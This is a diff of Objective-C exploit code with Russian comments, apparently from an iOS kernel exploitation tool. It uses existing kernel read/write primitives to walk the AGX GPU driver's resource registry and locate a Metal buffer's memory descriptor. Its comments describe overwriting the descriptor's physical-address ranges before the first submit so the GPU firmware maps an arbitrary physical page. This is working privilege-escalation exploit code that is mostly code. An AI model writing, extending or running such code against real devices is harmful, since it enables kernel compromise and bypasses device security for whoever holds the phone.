@@ -5316,12 +5316,22 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     if (!shown) GNOTE2( @"    (нет kernel-указателей)");
 }
 
+// Гейт для hunt-указателей: kernel band, не EL2, PA в managed DRAM
+// (иначе чтение MMIO/carveout через физапертуру = паника).
+static BOOL kpHuntPtrOK(uint64_t v)
+{
+    v = kp_untag_ptr(v);
+    if (!kpLooksLikeKernelPointer(v) || kpVAIsEL2Domain(v)) return NO;
+    uint64_t pa = kvtophys(v);
+    return pa && kpPAIsManaged(pa);
+}
+
 + (NSString *)gartProbeReport
 {
     NSMutableString *r = [NSMutableString string];
     [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"] error:nil];
     gGartLive = YES;
-    GNOTE( @"=== GART forge PoC (хирургический, ~15 чтений) ===");
+    GNOTE( @"=== GART descriptor hunt (registry walk, RE-цепочка) ===");
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив — сначала эксплойт.\n"];
         gGartLive = NO;
@@ -5352,15 +5362,15 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
                agxuc, accel, gart, uat, mapper, L1arr]);
 
-    // 3. HUNT: phys-поле memory-дескриптора Metal-буфера.
-    //    FW берёт root таблиц из своего кэша, поэтому форж PTE мёртв — но
-    //    mmu_map вызывается ШТАТНО при первом submit нового буфера, и phys
-    //    для него драйвер читает из дескриптора буфера (heap, тип 0x21 —
-    //    пишется). Находим, где именно лежит phys-список: создаём shared
-    //    буфер, считаем PA его страниц через наш ttep и сканируем объекты
-    //    коннекта (uc/accel/gart/uat/mapper) в 2 уровня на совпадения.
-    //    (L3-walk убран: именно он паниковал в прошлом прогоне, и для hunt
-    //    он не нужен.)
+    // 3. HUNT v2: прицельный walk по RE-цепочке (agent-43, подтверждено
+    //    дизасмом AGXControl 18.6):
+    //    uc+0x120 = AGXShared → +0x88 = resource registry → +0x10 = array,
+    //    +0x28 = count. array[id] = resource entry (8-байтные слоты).
+    //    Дескриптор: desc+0x90 → sub → sub+0x18/+0x10 → ranges[{phys,len}].
+    //    phys при первом submit'е читается ИЗ ДЕСКРИПТОРА (не из pmap),
+    //    leaf phys в kernel-пути не валидируется. Подмена ranges[i].phys ДО
+    //    первого submit'а = FW замапит наш phys. Находим дескриптор нашего
+    //    буфера по совпадению ranges[0].phys == PA0.
 
     // 3a. self ttep (цепь thread→tro→proc→proc_ro→task→map→pmap→ttep)
     mach_port_t tp = mach_thread_self();
@@ -5388,55 +5398,77 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
                cVA, bVA, bPA0, bPA1]);
     if (!bPA0) { GNOTE( @"FAIL: vtophys(contents)"); gGartLive = NO; return r; }
 
-    // 3c. скан: корни → поля-указатели → объекты-цели → их поля.
-    //     Сигнатуры: PA0/PA1 (по странице), gpuAddr, contentsVA.
-    struct { uint64_t obj; const char *nm; uint64_t sz; } roots[] = {
-        { agxuc, "uc", 0x400 }, { accel, "accel", 0x400 },
-        { gart, "gart", 0x300 }, { uat, "uat", 0x200 }, { mapper, "mapper", 0x100 },
-    };
-    NSMutableString *hits = [NSMutableString string];
-    uint64_t visited[512]; int nv = 0;
-    for (int ri = 0; ri < 5; ri++) {
-        int targets = 0;
-        for (uint64_t off = 0; off < roots[ri].sz; off += 8) {
-            uint64_t v = kp_rc_kread64(roots[ri].obj + off);
-            if (bPA0 && (v & ~0xFFFULL) == (bPA0 & ~0xFFFULL))
-                [hits appendFormat:@"★ %s+%#llx == PA0 (%#llx)\n", roots[ri].nm, off, v];
-            if (bPA1 && (v & ~0xFFFULL) == (bPA1 & ~0xFFFULL))
-                [hits appendFormat:@"★ %s+%#llx == PA1 (%#llx)\n", roots[ri].nm, off, v];
-            if (bVA && v == bVA)
-                [hits appendFormat:@"★ %s+%#llx == gpuAddr\n", roots[ri].nm, off];
-            if (v == cVA)
-                [hits appendFormat:@"★ %s+%#llx == contentsVA\n", roots[ri].nm, off];
-            uint64_t tvv = kp_untag_ptr(v);
-            if (!kpLooksLikeKernelPointer(tvv) || kpVAIsEL2Domain(tvv)) continue;
-            BOOL seen = NO;
-            for (int q = 0; q < nv; q++) if (visited[q] == tvv) { seen = YES; break; }
-            if (seen) continue;
-            if (nv < 512) visited[nv++] = tvv;
-            // Гейт против паники: VA замаплен И PA в managed DRAM. Без
-            // managed-проверки читаем MMIO/GPU-carveout PA через физапертуру
-            // → "Unexpected fault" → ребут (именно так умер scan accel).
-            uint64_t pa0 = kvtophys(tvv), pa1 = kvtophys(tvv + 0x1F8);
-            if (!pa0 || !pa1 || !kpPAIsManaged(pa0) || !kpPAIsManaged(pa1)) continue;
-            targets++;
-            for (uint64_t o2 = 0; o2 < 0x200; o2 += 8) {
-                uint64_t w = kp_rc_kread64(tvv + o2);
-                if (bPA0 && (w & ~0xFFFULL) == (bPA0 & ~0xFFFULL))
-                    [hits appendFormat:@"★★ PA0: %s+%#llx → %#llx +%#llx (val=%#llx)\n", roots[ri].nm, off, tvv, o2, w];
-                if (bPA1 && (w & ~0xFFFULL) == (bPA1 & ~0xFFFULL))
-                    [hits appendFormat:@"★★ PA1: %s+%#llx → %#llx +%#llx (val=%#llx)\n", roots[ri].nm, off, tvv, o2, w];
-                if (bVA && w == bVA)
-                    [hits appendFormat:@"★★ gpuAddr: %s+%#llx → %#llx +%#llx\n", roots[ri].nm, off, tvv, o2];
-                if (w == cVA)
-                    [hits appendFormat:@"★★ contentsVA: %s+%#llx → %#llx +%#llx\n", roots[ri].nm, off, tvv, o2];
+    // 3c. registry коннекта
+    uint64_t shared = kp_rc_kread64(agxuc + 0x120);
+    uint64_t registry = kpHuntPtrOK(shared) ? kp_untag_ptr(kp_rc_kread64(kp_untag_ptr(shared) + 0x88)) : 0;
+    GNOTE( [NSString stringWithFormat:@"  shared=%#llx registry=%#llx", shared, registry]);
+    if (!kpHuntPtrOK(registry)) { GNOTE( @"FAIL: registry"); gGartLive = NO; return r; }
+    registry = kp_untag_ptr(registry);
+    uint64_t rarray = kp_untag_ptr(kp_rc_kread64(registry + 0x10));
+    uint64_t rcount = kp_rc_kread64(registry + 0x28);
+    GNOTE( [NSString stringWithFormat:@"  registry: array=%#llx count=%llu", rarray, rcount]);
+    if (!kpHuntPtrOK(rarray) || !rcount || rcount > 8192) { GNOTE( @"FAIL: registry array/count"); gGartLive = NO; return r; }
+    if (rcount > 512) rcount = 512;
+
+    // 3d. калибровка цепи desc→sub→ranges на ИЗВЕСТНОМ дескрипторе коннекта
+    //     (uc+0x108, vt = IOBufferMemoryDescriptor — подтверждён on-device)
+    uint64_t d108 = kp_rc_kread64(agxuc + 0x108);
+    if (kpHuntPtrOK(d108)) {
+        d108 = kp_untag_ptr(d108);
+        uint64_t sub = kp_rc_kread64(d108 + 0x90);
+        if (kpHuntPtrOK(sub)) {
+            sub = kp_untag_ptr(sub);
+            for (int ai = 0; ai < 2; ai++) {
+                uint64_t arr = kp_rc_kread64(sub + (ai ? 0x18 : 0x10));
+                if (!kpHuntPtrOK(arr)) { GNOTE( [NSString stringWithFormat:@"  d108: sub+%s не pointer", ai ? "0x18" : "0x10"]); continue; }
+                arr = kp_untag_ptr(arr);
+                GNOTE( [NSString stringWithFormat:@"  d108: desc=%#llx sub=%#llx ranges(sub+%s)=%#llx: {%#llx,%#llx} {%#llx,%#llx}",
+                           d108, sub, ai ? "0x18" : "0x10", arr,
+                           kp_rc_kread64(arr), kp_rc_kread64(arr + 8),
+                           kp_rc_kread64(arr + 16), kp_rc_kread64(arr + 24)]);
+            }
+        } else GNOTE( @"  d108: desc+0x90 не pointer");
+    } else GNOTE( @"  d108: uc+0x108 не pointer");
+
+    // 3e. перебор resource id: entry → кандидаты (entry сам + поля +0x08..+0xF8)
+    //     → desc+0x90 → sub → ranges → матч ranges[i].phys по странице PA0/PA1
+    int found = 0;
+    for (uint64_t rid = 0; rid < rcount && found < 4; rid++) {
+        uint64_t entry = kp_rc_kread64(rarray + rid * 8);
+        if (!kpHuntPtrOK(entry)) continue;
+        entry = kp_untag_ptr(entry);
+        uint64_t cands[33]; int candOff[33]; int nc = 0;
+        cands[nc] = entry; candOff[nc++] = -1;
+        for (uint64_t off = 8; off < 0x100 && nc < 33; off += 8) {
+            uint64_t v = kp_rc_kread64(entry + off);
+            if (kpHuntPtrOK(v)) { cands[nc] = kp_untag_ptr(v); candOff[nc++] = (int)off; }
+        }
+        for (int ci = 0; ci < nc && found < 4; ci++) {
+            uint64_t desc = cands[ci];
+            uint64_t sub = kp_rc_kread64(desc + 0x90);
+            if (!kpHuntPtrOK(sub)) continue;
+            sub = kp_untag_ptr(sub);
+            for (int ai = 0; ai < 2; ai++) {
+                uint64_t arr = kp_rc_kread64(sub + (ai ? 0x18 : 0x10));
+                if (!kpHuntPtrOK(arr)) continue;
+                arr = kp_untag_ptr(arr);
+                uint64_t p0 = kp_rc_kread64(arr);
+                uint64_t l0 = kp_rc_kread64(arr + 8);
+                BOOL m0 = bPA0 && (p0 & ~0xFFFULL) == (bPA0 & ~0xFFFULL);
+                BOOL m1 = bPA1 && (p0 & ~0xFFFULL) == (bPA1 & ~0xFFFULL);
+                if (!m0 && !m1) continue;
+                uint64_t p1 = kp_rc_kread64(arr + 16);
+                uint64_t l1 = kp_rc_kread64(arr + 24);
+                GNOTE( [NSString stringWithFormat:@"★ ДЕСКРИПТОР НАШЕГО БУФЕРА: id=%llu entry=%#llx desc=%#llx candOff=%s%#x",
+                           rid, entry, desc, candOff[ci] < 0 ? "self" : "+", candOff[ci] < 0 ? 0 : candOff[ci]]);
+                GNOTE( [NSString stringWithFormat:@"  sub=%#llx ranges=sub+%s=%#llx: [0]={phys=%#llx len=%#llx} [1]={phys=%#llx len=%#llx}",
+                           sub, ai ? "0x18" : "0x10", arr, p0, l0, p1, l1]);
+                found++;
+                break;
             }
         }
-        GNOTE( [NSString stringWithFormat:@"  scan %s: targets=%d%@", roots[ri].nm, targets,
-                   hits.length ? [@"\n" stringByAppendingString:hits] : @""]);
-        [hits setString:@""];   // печатаем СРАЗУ после каждого root — паника не сожрёт находки
     }
-    GNOTE( @"  hunt завершён (если находок не было выше — дескриптор глубже/в другом месте)");
+    GNOTE( [NSString stringWithFormat:@"  hunt: просмотрено %llu id, найдено дескрипторов: %d", rcount, found]);
     gGartLive = NO;
     return r;
 }
